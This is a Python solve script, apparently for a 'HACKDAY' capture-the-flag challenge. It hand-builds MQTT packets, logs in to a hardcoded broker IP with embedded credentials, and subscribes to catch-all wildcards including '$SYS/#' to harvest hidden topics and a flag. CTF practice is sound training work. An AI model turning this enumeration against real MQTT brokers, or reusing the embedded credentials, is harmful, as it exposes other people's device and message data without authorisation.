import socket
import struct
import time
import random
import string

def mqtt_connect(client_id, username=None, password=None):
    flags = 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username:
        payload += struct.pack("!H", len(username)) + username.encode()
    if password:
        payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x10' + bytes([rem_len])
    return fixed_header + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x82' + bytes([rem_len])
    return fixed_header + var_header + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    s = socket.create_connection((server, port), timeout=10)
    s.sendall(mqtt_connect("topic-hunter-" + ''.join(random.choices(string.ascii_lowercase, k=3)), user, pwd))
    connack = s.recv(4)
    
    # Try different wildcards to find hidden topics
    topics = ["#", "+/#", "+/+/+", "$SYS/#"]
    for i, t in enumerate(topics):
        s.sendall(mqtt_subscribe(t, 7000 + i))
    
    start_time = time.time()
    found_topics = set()
    try:
        while time.time() - start_time < 30:
            data = s.recv(4096)
            if not data: break
            # Minimal parsing of PUBLISH to find topics
            # 0x30 ... length ... topic_len (2 bytes) ... topic
            try:
                i = 0
                while i < len(data):
                    if data[i] & 0xF0 == 0x30:
                        # Re-calculate remaining length
                        rem_len = data[i+1] # assuming single byte
                        topic_len = struct.unpack("!H", data[i+2:i+4])[0]
                        topic = data[i+4:i+4+topic_len].decode()
                        payload = data[i+4+topic_len:i+2+rem_len].decode(errors='ignore')
                        if topic not in found_topics:
                            print(f"[Topic] {topic}: {payload[:100]}")
                            found_topics.add(topic)
                        if "HACKDAY{" in payload:
                            print(f"[!!!] FLAG FOUND IN {topic}: {payload}")
                        i += 2 + rem_len
                    else:
                        i += 1
            except:
                i += 1
    except: pass
    finally:
        s.close()

if __name__ == "__main__":
    solve()
